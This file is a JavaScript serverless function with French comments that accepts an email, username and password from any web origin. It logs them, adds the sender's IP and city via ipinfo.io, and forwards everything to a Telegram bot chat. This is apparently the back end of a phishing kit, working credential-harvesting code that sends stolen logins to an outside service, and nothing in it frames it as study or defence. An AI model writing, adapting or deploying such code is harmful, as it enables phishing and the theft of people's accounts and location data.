export async function handler(event) {
  // Vérifier que la méthode HTTP est POST
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",  // Permet à toutes les origines d'accéder
        "Access-Control-Allow-Methods": "POST, OPTIONS", // Permet POST et OPTIONS
        "Access-Control-Allow-Headers": "Content-Type", // Permet l'en-tête Content-Type
      },
    };
  }

  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: "Method Not Allowed",
      headers: {
        "Access-Control-Allow-Origin": "*", // Permet l'accès à toutes les origines
        "Access-Control-Allow-Methods": "POST, OPTIONS", // Permet uniquement les requêtes POST
        "Access-Control-Allow-Headers": "Content-Type", // En-tête autorisé
      },
    };
  }

  try {
    // Extraction des données du corps de la requête
    const { usermail, user, pass } = JSON.parse(event.body);
    console.log("Données reçues:", { usermail, user, pass });

    // Vérifier si les champs sont présents
    if (!usermail || !user || !pass) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: "Champs manquants" }),
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type",
        },
      };
    }

    // Récupérer l'adresse IP de la requête
    const ip = event.headers["x-forwarded-for"] || event.headers["X-Forwarded-For"];
    console.log("IP reçue:", ip);

    // Utilisation de l'API ipinfo.io pour obtenir la localisation (IP -> Géolocalisation)
    const locationResponse = await fetch(`https://ipinfo.io/${ip}/json?token=TON_API_KEY`);
    const locationData = await locationResponse.json();

    // Extraire la ville, pays et l'IP
    const { city, country } = locationData;
    const ipLocation = `${ip} (${city}, ${country})`;

    // Récupérer le token Telegram et l'ID de chat à partir des variables d'environnement
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Préparer le message à envoyer
    const message = `
📩 Nouveau formulaire
🌍 IP : ${ipLocation}
👤 EMaiL : ${usermail}
👤 UsSER : ${user}
👤 PPass : ${pass}
    `;

    // Envoi du message à l'API Telegram
    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      }
    );

    // Analyse de la réponse de Telegram
    const data = await response.json();
    console.log("Réponse de Telegram:", data);

    // Si l'envoi a échoué, lever une erreur
    if (!response.ok) {
      throw new Error("Erreur Telegram");
    }

    // Retourner une réponse 200 en cas de succès
    return {
      statusCode: 200,
      body: JSON.stringify({ success: true }),
      headers: {
        "Access-Control-Allow-Origin": "*", // Permet à toutes les origines d'accéder
        "Access-Control-Allow-Methods": "POST, OPTIONS", // Méthodes autorisées
        "Access-Control-Allow-Headers": "Content-Type", // En-tête autorisé
      },
    };

  } catch (err) {
    // Gestion des erreurs (celles qui surviennent lors de l'envoi)
    console.error("Erreur dans la fonction:", err);

    return {
      statusCode: 500,
      body: JSON.stringify({ error: err.message }),
      headers: {
        "Access-Control-Allow-Origin": "*", // Permet l'accès à partir de n'importe quelle origine
        "Access-Control-Allow-Methods": "POST, OPTIONS", // Méthode autorisée
        "Access-Control-Allow-Headers": "Content-Type", // En-tête autorisé
      },
    };
  }
}

